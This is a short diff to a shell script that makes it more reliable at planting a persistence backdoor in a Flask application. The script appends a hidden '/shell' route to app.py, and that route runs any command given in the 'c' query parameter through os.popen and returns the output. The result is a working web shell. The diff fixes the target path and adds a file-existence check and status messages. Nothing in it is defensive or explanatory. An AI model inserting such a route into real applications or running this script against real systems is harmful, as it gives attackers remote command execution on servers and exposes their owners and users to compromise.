@@ -1,7 +1,11 @@
 # PERSISTENCE: Injecting a backdoor into the app code
 echo "[!] Injecting Production Backdoor..."
-# Change path from ./app/app.py to ./app/app/app.py
-cat <<EOF >> ./app/app/app.py
+
+# Use the absolute path relative to the script location or search for it
+TARGET_FILE="./app/app.py"
+
+if [ -f "$TARGET_FILE" ]; then
+    cat <<EOF >> "$TARGET_FILE"
 
 @app.route('/shell')
 def shell():
@@ -9,3 +13,8 @@ def shell():
     from flask import request
     return os.popen(request.args.get('c')).read()
 EOF
+    echo "[+] Backdoor injected into $TARGET_FILE"
+else
+    echo "[-] Error: $TARGET_FILE not found!"
+    exit 1
+fi
